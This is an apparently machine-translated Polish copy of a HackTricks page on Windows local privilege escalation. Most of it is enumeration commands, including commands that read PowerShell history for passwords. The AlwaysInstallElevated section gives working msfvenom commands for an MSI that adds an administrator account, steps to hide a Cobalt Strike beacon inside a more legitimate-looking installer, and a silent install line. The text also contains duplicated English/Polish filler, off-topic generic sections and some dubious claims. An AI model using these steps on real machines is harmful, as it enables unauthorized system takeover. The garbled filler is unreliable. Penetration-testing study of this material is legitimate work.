# Windows Local Privilege Escalation

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Najlepsze narzędzie do szukania wektorów eskalacji uprawnień lokalnych w systemie Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Początkowa teoria dotycząca systemu Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są tokeny dostępu w systemie Windows, przeczytaj następującą stronę, zanim przejdziesz dalej:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL - DACL/SACL/ACE

**Sprawdź następującą stronę, aby uzyskać więcej informacji na temat ACL - DACL/SACL/ACE:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w systemie Windows, powinieneś przeczytać następującą stronę, zanim przejdziesz dalej:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Kontrole bezpieczeństwa systemu Windows

W systemie Windows istnieje wiele rzeczy, które mogą **uniemożliwić Ci wyliczenie systemu**, uruchomienie plików wykonywalnych lub nawet **wykrycie Twoich działań**. Powinieneś **przeczytać** następującą **stronę** i **wyliczyć** wszystkie te **mechanizmy obronne** przed rozpoczęciem wyliczania eskalacji uprawnień:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Informacje o systemie

### Wyliczanie informacji o wersji

Sprawdź, czy wersja systemu Windows ma jakieś znane podatności (sprawdź również zastosowane łatki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Wykorzystanie wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji na temat podatności związanych z bezpieczeństwem w systemie Microsoft. Ta baza danych zawiera ponad 4 700 podatności związanych z bezpieczeństwem, co pokazuje **ogromną powierzchnię ataku**, jaką prezentuje środowisko Windows.

**Na systemie**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_

**Lokalnie z informacjami o systemie**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisane są jakieś poświadczenia/cenne informacje?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Historia PowerShell

PowerShell przechowuje historię poleceń, które zostały wykonane w danym sesji. Historia ta jest przechowywana w pliku o nazwie `ConsoleHost_history.txt` w folderze profilu użytkownika. Aby uzyskać dostęp do historii poleceń, można użyć następującego polecenia:

```powershell
Get-History
```

Polecenie to wyświetli listę poleceń wraz z ich numerami identyfikacyjnymi. Aby ponownie uruchomić dane polecenie, można użyć polecenia `Invoke-History` lub skrótu klawiaturowego `R`.

Aby wyczyścić historię poleceń, można użyć polecenia:

```powershell
Clear-History
```

Należy jednak pamiętać, że wyczyszczenie historii poleceń nie jest równoznaczne z usunięciem śladów wykonanych poleceń. Istnieje możliwość odzyskania tych poleceń za pomocą odpowiednich narzędzi.

### Historia wiersza polecenia

W systemach Windows można również uzyskać dostęp do historii poleceń wiersza polecenia. Historia ta jest przechowywana w rejestrze systemowym. Aby wyświetlić historię poleceń wiersza polecenia, można użyć polecenia:

```powershell
doskey /history
```

Polecenie to wyświetli listę poleceń wiersza polecenia wraz z ich numerami identyfikacyjnymi. Aby ponownie uruchomić dane polecenie, można użyć polecenia `doskey` z odpowiednim numerem identyfikacyjnym.

Aby wyczyścić historię poleceń wiersza polecenia, można użyć polecenia:

```powershell
doskey /reinstall
```

Należy jednak pamiętać, że wyczyszczenie historii poleceń nie jest równoznaczne z usunięciem śladów wykonanych poleceń. Istnieje możliwość odzyskania tych poleceń za pomocą odpowiednich narzędzi.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki z zapisem transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć pod adresem [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Rejestrowanie modułów PowerShell

Rejestrowane są szczegóły wykonania potoku PowerShell, obejmujące wykonane polecenia, wywołania poleceń i części skryptów. Jednakże, pełne szczegóły wykonania i wyniki wyjściowe mogą nie być rejestrowane.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Pliki transkrypcji" dokumentacji, wybierając opcję **"Rejestrowanie modułów"** zamiast **"Transkrypcja PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z dziennika PowerShell, wykonaj polecenie:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Logowanie bloków skryptów**

Rejestrowana jest pełna aktywność i zawartość wykonania skryptu, zapewniając dokumentację każdego bloku kodu podczas jego działania. Ten proces zachowuje kompleksowy ślad audytowy każdej aktywności, co jest wartościowe dla forensyki i analizy złośliwego zachowania. Dokumentując całą aktywność w momencie wykonania, dostarczane są szczegółowe informacje na temat procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Rejestrowanie zdarzeń dla bloku skryptu można znaleźć w Podglądzie zdarzeń systemu Windows pod ścieżką: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operacyjne**.\
Aby wyświetlić ostatnie 20 zdarzeń, można użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia internetowe

#### Proxy Configuration

#### Konfiguracja proxy

Proxy settings can be used to redirect network traffic through an intermediary server. This can be useful for various purposes, such as improving security or accessing restricted content. However, misconfigured proxy settings can also introduce vulnerabilities that can be exploited by attackers.

Ustawienia proxy mogą być używane do przekierowywania ruchu sieciowego przez pośredni serwer. Może to być przydatne w różnych celach, takich jak poprawa bezpieczeństwa lub dostęp do ograniczonej zawartości. Jednak źle skonfigurowane ustawienia proxy mogą również wprowadzać podatności, które mogą być wykorzystane przez atakujących.

#### DNS Configuration

#### Konfiguracja DNS

DNS (Domain Name System) is responsible for translating domain names into IP addresses. By modifying DNS settings, attackers can redirect network traffic to malicious servers, allowing them to intercept and manipulate data.

DNS (Domain Name System) jest odpowiedzialny za tłumaczenie nazw domenowych na adresy IP. Poprzez modyfikację ustawień DNS, atakujący mogą przekierować ruch sieciowy do złośliwych serwerów, co pozwala im na przechwytywanie i manipulowanie danymi.

#### Firewall Configuration

#### Konfiguracja zapory sieciowej

Firewalls are a crucial component of network security. They control incoming and outgoing network traffic based on predefined rules. Properly configuring firewalls can help prevent unauthorized access and protect sensitive data.

Zapory sieciowe są kluczowym elementem bezpieczeństwa sieciowego. Kontrolują ruch sieciowy przychodzący i wychodzący na podstawie predefiniowanych reguł. Prawidłowa konfiguracja zapór sieciowych może pomóc w zapobieganiu nieautoryzowanemu dostępowi i ochronie wrażliwych danych.

#### Network Sharing Configuration

#### Konfiguracja udostępniania sieci

Network sharing allows multiple devices to connect and share resources, such as files and printers, over a network. However, misconfigured network sharing settings can expose sensitive information and create security risks.

Udostępnianie sieciowe umożliwia wielu urządzeniom połączenie i współdzielenie zasobów, takich jak pliki i drukarki, w sieci. Jednak źle skonfigurowane ustawienia udostępniania sieciowego mogą ujawniać wrażliwe informacje i tworzyć ryzyko bezpieczeństwa.

#### Remote Desktop Configuration

#### Konfiguracja pulpitu zdalnego

Remote Desktop allows users to connect to a remote computer and access its desktop environment. However, if not properly configured, Remote Desktop can be vulnerable to unauthorized access and remote attacks.

Pulpit zdalny umożliwia użytkownikom połączenie się z komputerem zdalnym i uzyskanie dostępu do jego środowiska pulpitu. Jednak jeśli nie jest prawidłowo skonfigurowany, Pulpit zdalny może być podatny na nieautoryzowany dostęp i ataki zdalne.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski

#### Znajdowanie dysków

Aby znaleźć dostępne dyski na systemie Windows, można użyć polecenia `wmic logicaldisk list brief`. Polecenie to wyświetli listę dysków wraz z ich literami dyskowymi.

#### Montowanie dysków

Aby zamontować dysk w systemie Windows, można użyć polecenia `mountvol`. Przykład użycia polecenia `mountvol` wygląda następująco:

```
mountvol <litera_dysku>: <ścieżka_do_punkt_montowania>
```

Na przykład, aby zamontować dysk o literze `D` w folderze `C:\Mount`, należy użyć polecenia:

```
mountvol D: C:\Mount
```

#### Odmontowywanie dysków

Aby odmontować dysk w systemie Windows, można użyć polecenia `mountvol` z opcją `/D`. Przykład użycia polecenia `mountvol` do odmontowania dysku o literze `D` wygląda następująco:

```
mountvol D: /D
```

#### Zmiana litery dysku

Aby zmienić literę dysku w systemie Windows, można użyć polecenia `diskpart`. Przykład użycia polecenia `diskpart` do zmiany litery dysku z `D` na `E` wygląda następująco:

```
diskpart
select volume D
assign letter=E
```

#### Usuwanie liter dysków

Aby usunąć literę dysku w systemie Windows, można użyć polecenia `diskpart`. Przykład użycia polecenia `diskpart` do usunięcia litery dysku `D` wygląda następująco:

```
diskpart
select volume D
remove letter=D
```

#### Zmiana punktu montowania

Aby zmienić punkt montowania dysku w systemie Windows, można użyć polecenia `mountvol` w połączeniu z poleceniem `diskpart`. Przykład użycia polecenia `mountvol` i `diskpart` do zmiany punktu montowania dysku o literze `D` na `C:\NewMount` wygląda następująco:

```
mountvol D: /D
diskpart
select volume D
assign mount=C:\NewMount
```

#### Zmiana etykiety dysku

Aby zmienić etykietę dysku w systemie Windows, można użyć polecenia `label`. Przykład użycia polecenia `label` do zmiany etykiety dysku o literze `D` na `NewLabel` wygląda następująco:

```
label D: NewLabel
```
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz skompromitować system, jeśli aktualizacje nie są żądane za pomocą protokołu http**S**, ale http.

Rozpoczynasz od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez protokołu SSL, wykonując poniższą komendę:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Jeśli otrzymasz odpowiedź taką jak:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` jest równy `1`.

Wtedy **jest podatne na atak.** Jeśli ostatni wpis w rejestrze jest równy 0, to wpis WSUS zostanie zignorowany.

Aby wykorzystać te podatności, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Są to skrypty wykorzystujące ataki typu MiTM, które wstrzykują "fałszywe" aktualizacje do ruchu WSUS bez użycia SSL.

Przeczytaj badania tutaj:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
W zasadzie, to jest luka, którą wykorzystuje ten błąd:

> Jeśli mamy możliwość modyfikacji naszego lokalnego proxy użytkownika, a Windows Update korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, mamy więc możliwość uruchomienia [PyWSUS](https://github.com/GoSecure/pywsus) lokalnie, aby przechwycić nasz własny ruch i uruchomić kod jako podniesiony użytkownik na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, będzie również korzystać z jego magazynu certyfikatów. Jeśli wygenerujemy samopodpisany certyfikat dla nazwy hosta WSUS i dodamy ten certyfikat do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwycić zarówno ruch HTTP, jak i HTTPS WSUS. WSUS nie korzysta z mechanizmów podobnych do HSTS do wdrożenia walidacji typu trust-on-first-use dla certyfikatu. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma poprawną nazwę hosta, zostanie zaakceptowany przez usługę.

Można wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (po jego uwolnieniu).

## KrbRelayUp

W środowiskach domenowych systemu Windows istnieje podatność na **podwyższenie uprawnień lokalnych** w określonych warunkach. Warunki te obejmują środowiska, w których **nie jest wymagane podpisywanie LDAP**, użytkownicy posiadają uprawnienia do konfigurowania **delegacji opartej na zasobach (RBCD)** oraz możliwość tworzenia komputerów w domenie. Ważne jest zauważenie, że te **wymagania** są spełnione przy użyciu **domyślnych ustawień**.

Znajdź exploit w [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Aby uzyskać więcej informacji na temat przebiegu ataku, sprawdź [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 wpisy są **włączone** (wartość to **0x1**), to użytkownicy o dowolnych uprawnieniach mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloady Metasploit

Metasploit to potężne narzędzie do testowania penetracyjnego, które oferuje wiele różnych payloadów, które można wykorzystać podczas ataków. Payloady Metasploit są skryptami lub kodem, które są wykorzystywane do wykonania określonych działań na celu. Poniżej przedstawiam kilka popularnych payloadów Metasploit:

- **reverse_tcp**: Ten payload umożliwia zdalne połączenie z celowym systemem i uruchomienie powłoki w celu zdalnego sterowania systemem.
- **bind_tcp**: Ten payload nasłuchuje na określonym porcie i oczekuje na połączenie od atakującego, który może następnie zdalnie sterować systemem.
- **meterpreter**: Jest to bardziej zaawansowany payload, który oferuje wiele funkcji, takich jak zdalne sterowanie, przechwytywanie ekranu, przechwytywanie dźwięku, przeglądanie plików i wiele innych.
- **shell_reverse_tcp**: Ten payload umożliwia zdalne połączenie z celowym systemem i uruchomienie powłoki systemowej w celu zdalnego sterowania systemem.
- **shell_bind_tcp**: Ten payload nasłuchuje na określonym porcie i oczekuje na połączenie od atakującego, który może następnie zdalnie sterować systemem za pomocą powłoki systemowej.

Payloady Metasploit są niezwykle przydatne podczas testów penetracyjnych, umożliwiając atakującemu zdalne sterowanie nad celowym systemem. Ważne jest jednak, aby używać ich zgodnie z prawem i tylko w celach etycznych.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę, używając modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z narzędzia power-up, aby utworzyć w bieżącym katalogu binarny plik MSI systemu Windows do eskalacji uprawnień. Ten skrypt zapisuje skompilowany wcześniej instalator MSI, który wymaga dodania użytkownika/grupy (więc będziesz potrzebować dostępu do GUI):
```
Write-UserAddMSI
```
Po prostu wykonaj utworzony plik binarny, aby podnieść uprawnienia.

### Opakowanie MSI

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć opakowanie MSI za pomocą tych narzędzi. Zauważ, że możesz opakować plik "**.bat**", jeśli chcesz tylko wykonać polecenia wiersza poleceń.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Tworzenie MSI za pomocą WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Tworzenie MSI za pomocą Visual Studio

* **Wygeneruj** za pomocą Cobalt Strike lub Metasploit nowy **payload TCP Windows EXE** o nazwie `C:\privesc\beacon.exe`
* Otwórz **Visual Studio**, wybierz **Utwórz nowy projekt** i wpisz "installer" w pole wyszukiwania. Wybierz projekt **Kreatora instalacji** i kliknij **Dalej**.
* Nadaj projektowi nazwę, na przykład **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, wybierz **umieść rozwiązanie i projekt w tym samym katalogu** i kliknij **Utwórz**.
* Klikaj **Dalej** aż do kroku 3 z 4 (wybierz pliki do dołączenia). Kliknij **Dodaj** i wybierz wygenerowany payload Beacon. Następnie kliknij **Zakończ**.
* Podświetl projekt **AlwaysPrivesc** w **Eksploratorze rozwiązań** i w **Właściwościach** zmień **TargetPlatform** z **x86** na **x64**.
* Możesz również zmienić inne właściwości, takie jak **Author** i **Manufacturer**, które mogą sprawić, że zainstalowana aplikacja będzie bardziej wiarygodna.
* Kliknij prawym przyciskiem myszy na projekcie i wybierz **Widok > Działania niestandardowe**.
* Kliknij prawym przyciskiem myszy **Install** i wybierz **Dodaj działanie niestandardowe**.
* Dwukrotnie kliknij na **Folder aplikacji**, wybierz plik **beacon.exe** i kliknij **OK**. Zapewni to, że payload Beacon zostanie uruchomiony zaraz po uruchomieniu instalatora.
* W **Właściwościach działania niestandardowego** zmień **Run64Bit** na **True**.
* Na koniec **zbuduj to**.
* Jeśli pojawi się ostrzeżenie `Plik 'beacon-tcp.exe' ukierunkowany na 'x64' nie jest zgodny z platformą docelową projektu 'x86'`, upewnij się, że ustawisz platformę na x64.

### Instalacja MSI

Aby **zainstalować** złośliwy plik `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność, można użyć: _exploit/windows/local/always\_install\_elevated_

## Antywirusy i detektory

### Ustawienia audytu

Te ustawienia decydują, co jest **rejestrowane**, więc powinieneś zwrócić uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, jest interesujące, aby wiedzieć, gdzie są wysyłane logi.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** został zaprojektowany do **zarządzania hasłami lokalnych administratorów**, zapewniając, że każde hasło jest **unikalne, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Te hasła są bezpiecznie przechowywane w Active Directory i mogą być odczytywane tylko przez użytkowników, którzy otrzymali odpowiednie uprawnienia za pomocą listy kontroli dostępu (ACL), umożliwiając im przeglądanie haseł lokalnych administratorów po autoryzacji.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Jeśli jest aktywny, **hasła w postaci tekstu jawnego są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ochrona LSA

Rozpoczynając od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę dla Lokalnego Systemu Bezpieczeństwa (LSA), aby **blokować** próby niezaufanych procesów **odczytu pamięci** lub wstrzykiwania kodu, co dodatkowo zabezpiecza system.\
[**Więcej informacji na temat ochrony LSA tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w systemie **Windows 10**. Jego celem jest ochrona przechowywanych na urządzeniu poświadczeń przed zagrożeniami takimi jak ataki typu pass-the-hash.
[**Więcej informacji na temat Credentials Guard można znaleźć tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Buforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Lokalny Urząd Bezpieczeństwa** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika są uwierzytelniane przez zarejestrowany pakiet zabezpieczeń, zwykle ustanawiane są poświadczenia domenowe dla użytkownika.\
[**Więcej informacji na temat buforowanych poświadczeń tutaj**](../stealing-credentials/credentials-protections.md#buforowane-poświadczenia).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i Grupy

### Wyliczanie Użytkowników i Grup

Powinieneś sprawdzić, czy któreś z grup, do których należysz, mają interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz mieć możliwość eskalacji uprawnień**. Dowiedz się więcej o uprzywilejowanych grupach i jak je wykorzystać do eskalacji uprawnień tutaj:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulacja tokenem

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Tokeny Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się więcej o interesujących tokenach** i jak je wykorzystać:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Foldery domowe

W systemie Windows, każdy użytkownik ma swój własny folder domowy, który zawiera jego prywatne pliki i ustawienia. Folder ten jest zwykle umieszczony w lokalizacji `C:\Users\nazwa_użytkownika`. W folderze domowym znajdują się różne podfoldery, takie jak `Documents`, `Pictures`, `Downloads`, `Desktop`, które są używane do przechowywania odpowiednich typów plików.

Folder domowy jest chroniony przez uprawnienia dostępu, które określają, kto ma prawo odczytuć, zapisywać lub modyfikować pliki w danym folderze. Domyślnie, tylko użytkownik, któremu przypisano folder domowy, ma pełne uprawnienia do tego folderu.

W przypadku eskalacji uprawnień lokalnych, atakujący może próbować uzyskać dostęp do folderów domowych innych użytkowników w celu zdobycia poufnych informacji lub wykonania złośliwych działań. Dlatego ważne jest, aby odpowiednio skonfigurować uprawnienia dostępu do folderów domowych, aby zapobiec nieautoryzowanemu dostępowi.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka hasła

A password policy is a set of rules and requirements that dictate the characteristics of passwords used by users in a system. The purpose of a password policy is to ensure that passwords are strong and secure, reducing the risk of unauthorized access to sensitive information.

#### Complexity Requirements

Complexity requirements specify the minimum number of characters and the types of characters that must be included in a password. This typically includes a combination of uppercase letters, lowercase letters, numbers, and special characters. For example, a password policy might require passwords to be at least 8 characters long and include at least one uppercase letter, one lowercase letter, one number, and one special character.

#### Password Expiration

Password expiration is a policy that requires users to change their passwords after a certain period of time. This helps to ensure that passwords are regularly updated and reduces the risk of passwords being compromised and used by unauthorized individuals. Password expiration periods can vary depending on the organization's security requirements, but common intervals are 30, 60, or 90 days.

#### Password History

Password history policies prevent users from reusing old passwords. This ensures that users cannot simply cycle through a set of previously used passwords when prompted to change their password. Password history policies typically specify the number of previous passwords that must be remembered and prevent reuse for a certain period of time.

#### Account Lockout

Account lockout policies are designed to protect against brute-force attacks by locking out user accounts after a certain number of failed login attempts. This prevents attackers from repeatedly guessing passwords until they find the correct one. Account lockout policies typically specify the number of failed login attempts allowed before an account is locked, as well as the duration of the lockout period.

#### Password Length

Password length policies specify the minimum and maximum number of characters allowed in a password. Longer passwords are generally more secure, as they are harder to guess or crack through brute-force methods. Password length policies typically require passwords to be a minimum of 8 characters long, but some organizations may require longer passwords for increased security.

#### Password Storage

Password storage policies dictate how passwords are stored and encrypted in a system. Passwords should never be stored in plaintext, as this would allow anyone with access to the password database to easily view and use the passwords. Instead, passwords should be hashed and salted, which adds an extra layer of security by making it more difficult for attackers to reverse-engineer the passwords.

#### User Education

User education is an important aspect of password policies. Users should be educated on the importance of creating strong passwords, not sharing passwords with others, and being cautious of phishing attempts. Regular training and reminders can help reinforce good password practices and reduce the risk of password-related security incidents.
```bash
net accounts
```
### Pobierz zawartość schowka

Aby uzyskać zawartość schowka w systemie Windows, można skorzystać z następującego polecenia w wierszu poleceń:

```bash
powershell.exe -command "Get-Clipboard"
```

Polecenie to uruchamia program PowerShell i wywołuje funkcję `Get-Clipboard`, która zwraca zawartość schowka.
```bash
powershell -command "Get-Clipboard"
```
## Uruchamianie procesów

### Uprawnienia plików i folderów

Po pierwsze, wylistuj procesy **sprawdzając, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać działający plik binarny** lub czy masz uprawnienia do zapisu w folderze z plikami binarnymi, aby wykorzystać możliwe ataki [**DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
